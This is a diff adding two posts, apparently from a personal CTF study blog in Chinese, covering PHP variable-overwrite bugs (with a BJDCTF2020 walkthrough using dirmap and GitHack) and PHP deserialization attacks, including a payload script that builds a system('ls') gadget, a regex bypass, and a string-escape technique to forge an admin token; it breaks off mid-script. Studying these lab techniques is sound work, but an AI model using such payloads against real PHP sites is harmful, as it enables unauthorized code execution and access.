@@ -147,6 +147,218 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/24/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/24/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" class="post-title-link" itemprop="url">变量覆盖</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-03-24 18:48:09" itemprop="dateCreated datePublished" datetime="2021-03-24T18:48:09+08:00">2021-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-18 23:14:03" itemprop="dateModified" datetime="2021-09-18T23:14:03+08:00">2021-09-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="导致的变量覆盖"><a href="#导致的变量覆盖" class="headerlink" title="$$导致的变量覆盖"></a>$$导致的变量覆盖</h2><p>$$这种写法称为可变变量</p>
+<p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;hello&quot;;</span><br><span class="line">echo &quot;$a&quot;;              &#x2F;&#x2F;输出hello</span><br><span class="line">$a&#x3D;&quot;world&quot;;         &#x2F;&#x2F;即hello这个变量等于world($hello&#x3D;world)，变量a仍为hello</span><br><span class="line">echo &quot;$a&quot;;              &#x2F;&#x2F;输出hello</span><br><span class="line">echo &quot;$$a&quot;;            &#x2F;&#x2F;输出world</span><br><span class="line">echo &quot;$a $&#123;$a&#125;&quot;;    &#x2F;&#x2F;输出hello world</span><br><span class="line">echo &quot;$a $hello&quot;;  &#x2F;&#x2F;输出hello world</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞的产生"><a href="#漏洞的产生" class="headerlink" title="漏洞的产生"></a>漏洞的产生</h2><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">foreach ($_GET as $key &#x3D;&gt; $value) &#123;   &#x2F;&#x2F;get得到的数据$key和$value</span><br><span class="line">$&#123;$key&#125; &#x3D; $value;  &#x2F;&#x2F;$&#123;$key&#125;用get传进来的$key做为新的变量,将get传进来的$value赋值给它。</span><br><span class="line">&#125;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>例如：get ?a=1 第3行回解析为$a=1。就造成了变量覆盖。</p>
+<p>作者：nice_o<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a4d782e91852">https://www.jianshu.com/p/a4d782e91852</a><br>来源：简书</p>
+<h2 id="题目：-BJDCTF2020-Mark-loves-cat"><a href="#题目：-BJDCTF2020-Mark-loves-cat" class="headerlink" title="题目：[BJDCTF2020]Mark loves cat/"></a>题目：[BJDCTF2020]Mark loves cat/</h2><p>停了几天，没学漏洞。把python学了点，然后想着把这个题再复现</p>
+<p>dirmap扫目录发现git泄露（python3）</p>
+<pre><code>python3 dirmap.py -i http://539fa1aa-9762-4ad0-aeef-5dabce638c51.node3.buuoj.cn/ -lcf</code></pre>
+<p>Githack扫git(python2)<br>    python2 Githack.py <a target="_blank" rel="noopener" href="http://539fa1aa-9762-4ad0-aeef-5dabce638c51.node3.buuoj.cn/.git/">http://539fa1aa-9762-4ad0-aeef-5dabce638c51.node3.buuoj.cn/.git/</a></p>
+<p>圆规正转：</p>
+<p>flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>index.php有效代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $y;       &#x2F;&#x2F;变量覆盖</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;    &#x2F;&#x2F;参数中的flag等于某个键名，且键名不含有字符flag</span><br><span class="line">        exit($handsome);    &#x2F;&#x2F;退出脚本同时输出变量</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;  &#x2F;&#x2F;get和post传参键名不含flag</span><br><span class="line">    exit($yds);  &#x2F;&#x2F; ?yds&#x3D;flag  $x&#x3D;yas $y&#x3D;flag  $$x&#x3D;$$y   $(yds)&#x3D;$(flag) exit($yds)即exit（$flag）输出flag字符串</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;   &#x2F;&#x2F;get或post参数值绝对等于flag</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;  &#x2F;&#x2F;  ?flag&#x3D;flag&amp;is&#x3D;flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>if语句中的exit()函数虽然会退出执行，但也会输出其参数，可以利用变量覆盖将exit()函数内的参数用$flag覆盖掉就能输出flag了；</p>
+<p>目的就是利用exit输出的变量根据foreach()函数条件替换成$flag输出$flag字符串</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-03-20 22:22:06" itemprop="dateCreated datePublished" datetime="2021-03-20T22:22:06+08:00">2021-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-11 16:54:37" itemprop="dateModified" datetime="2021-09-11T16:54:37+08:00">2021-09-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>边学习边总结</p>
+<h2 id="反序列化简介"><a href="#反序列化简介" class="headerlink" title="反序列化简介"></a>反序列化简介</h2><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化</p>
+<p><strong>serialize</strong> 将对象格式化成有序的字符串</p>
+<p><strong>unserialize</strong> 将字符串还原成原来的对象</p>
+<p>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</p>
+<p>解题思路就是想办法通过序列化传入有效内容获取flag,255,256传入参数覆盖本来的内容使得满足条件,257利用魔法函数结合命令执行</p>
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() &#x2F;&#x2F;执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() &#x2F;&#x2F;对象被销毁时触发：通过_construct()函数产生所需要的类，销毁时执行指向类内的函数达到应用要求</span><br><span class="line">__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() &#x2F;&#x2F;用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() &#x2F;&#x2F;用于将数据写入不可访问的属性</span><br><span class="line">__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() &#x2F;&#x2F;把类当作字符串使用时触发</span><br><span class="line">__invoke() &#x2F;&#x2F;当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p><strong>注意</strong>:</p>
+<p>如果类中同时定义了 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 两个魔术方法，则只有 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a> 方法会生效，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 方法会被忽略。</p>
+<p>如果类中同时定义了 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a> 两个魔术方法，则只有 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a> 方法会被调用。 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a> 方法会被忽略掉。如果对象实现了 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.serializable.php">Serializable</a> 接口，接口的 <code>serialize()</code> 方法会被忽略，做为代替类中的 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a> 方法会被调用。</p>
+<p>应用：261</p>
+</blockquote>
+<h2 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h2><p>preg_match(‘/^O:\d+/‘)匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p>
+<p>利用加号绕过（注意在url里传参时+要编码为%2B）<br>serialize(array(a ) ) ; / / a));//a));//a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)<br>（原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692%EF%BC%89">https://blog.csdn.net/solitudi/article/details/113588692）</a></p>
+<p><code>/[oc]:\d+:/i</code>这题过滤的是   O或C:数字   的格式，注意将所有O:数字的地方都替换成O:+数字,如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $class &#x3D; &#39;info&#39;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class&#x3D;new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code&#x3D;&quot;system(&#39;ls&#39;);&quot;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;serialize(new ctfShowUser());</span><br><span class="line">$b &#x3D; str_replace(&#39;O:11&#39;,&#39;O:+11&#39;, $a);</span><br><span class="line">$c &#x3D; str_replace(&#39;O:8&#39;,&#39;O:+8&#39;, $b);</span><br><span class="line">echo(urlencode($c));</span><br></pre></td></tr></table></figure>
+<h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h2><p>PHP在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容的，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，当序列化的长度不对应的时候会出现报错<br>字符逃逸的本质其实也是闭合，分为两种情况，一是字符变多，二是字符变少</p>
+<h3 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h3><p>根据大佬<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/">Y4tacker</a>给的源码，我在本地开始测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>); <span class="comment">//把反序列化后的一个x替换成为两个</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line">var_dump(serialize(<span class="variable">$arr</span>));  <span class="comment">//显示序列化后的名字和年龄</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = change(serialize(<span class="variable">$arr</span>));  <span class="comment">//将内容序列化，再调用替换函数把内容中的x变成xx</span></span><br><span class="line"><span class="variable">$new</span> = unserialize(<span class="variable">$old</span>);   <span class="comment">//将替换后的内容反序列化</span></span><br><span class="line">var_dump(<span class="variable">$new</span>);   <span class="comment">//数组形式输出最后内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>正常传入name=daqiang,不含x不存在替换</p>
+<p><img src="/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/blog\jdqblog\source_posts\反序列化\1.png"></p>
+<p>当传入内容为name=daqiangx，反序列化失败，由于溢出(s本来是8结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p>
+<p>报错的主要原因是：由于字符替换，导致序列化后的显示字符串长度与序列化内容所反映的长度不相等</p>
+<p><img src="/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/blog\jdqblog\source_posts\反序列化\2.png"></p>
+<p>以上是问题所在</p>
+<p>当输入内容为name=daqiangxxxxxxxxxxxxxxxxxxxx”;i:1;s:6:”woaini”;}</p>
+<p><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>这一部分一共二十个字符</p>
+<p>这个内容能解决报错：用20个x替换后多出来的20个x取代多余的”;i:1;s:6:”woaini”;}这20个字符，同时字符串中的”和打印序列化字符串前的”闭合，使得;i:1;s:6:”woaini”;}被舍弃，不参与反序列化。总体来说，通过这样的内容，既满足数目正确不报错</p>
+<p>达到改变固有变量值的作用</p>
+<p><img src="/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/blog\jdqblog\source_posts\反序列化\3.png"></p>
+<h4 id="demo-262"><a href="#demo-262" class="headerlink" title="demo:262"></a>demo:262</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># @message.php //提示还有一个php文件</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];  <span class="comment">//传参</span></span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);    <span class="comment">//新定义对象为msg</span></span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));  <span class="comment">//将序列化后的$msg中的fuck用loveU替换</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode(<span class="variable">$umsg</span>)); <span class="comment">//</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//message.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>])); <span class="comment">//将msg解码再反序列化</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;  <span class="comment">//反序列化内容中</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路：目的是要让msg序列化再反序列化结果中的token值覆盖为admin，由于str_replace函数使得字符增多，考虑反序列化逃逸</p>
+<p>题目分析：题目新定义对象msg，将其序列化，并将结果中的fuck替换成loveU得umsg（字符增1）， 然后提交名为msg,值为base64编码的umsg。然后再重新将msg的值解码赋给msg，如果该内容含token值为admin，则得到flag</p>
+<p>复现：</p>
+<p>写测试脚本构造对msg进行序列化,模仿例子中的脚本。注意区别：例子是数组，262是对象。定义对象然后序列化新定义的msg，然后输出其序列化结果，参数为1时不进行替换函数，即操作为序列化为umsg,再反序列化成msg，结果正常。</p>
+<p>当t值含fuck时，内容序列化，结果中的内容实际长度与其标记长度不一致，再经过反序列化使得长度变化，目的将”;s:5:”token”;s:4:”user”;}变成无用字符串，同时加入整体反序列化结果含token=admin的有效内容    “;s:5”token”;s:5:”admin”;}，总结就是用loveU来加位数拓展字符到让”;s:5”token”;s:5:”admin”;}完全进入：为27位即需要27个fuck(不用考虑”;s:5:”token”;s:4:”user”;}，admin后面的括号自动会把后面的内容作废)     总结：考虑fuck数只考虑有效内容的长度就行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$m</span> = <span 